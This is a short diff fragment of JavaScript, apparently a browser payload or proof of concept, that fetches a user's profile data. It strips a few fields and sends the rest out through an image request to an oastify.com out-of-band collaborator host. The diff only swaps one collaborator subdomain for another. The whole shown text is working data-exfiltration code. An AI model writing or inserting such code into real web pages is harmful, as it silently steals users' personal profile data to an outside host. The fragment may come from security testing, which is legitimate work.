@@ -13,9 +13,8 @@
         betaFeatures,
         ...slimProfileData
       } = profileData;
-
       const img = new Image();
-      img.src = "qe8uw9sj172633tw07dv120wcnie6hu6.oastify.com" + encodeURIComponent(JSON.stringify(slimProfileData));
+      img.src = "1bd5tkpuyizh0eq7xia6ydx79yfp3tri.oastify.com" + encodeURIComponent(JSON.stringify(slimProfileData));
     })
     .catch(err => console.error("Profile fetch failed or blocked:", err));
 })();
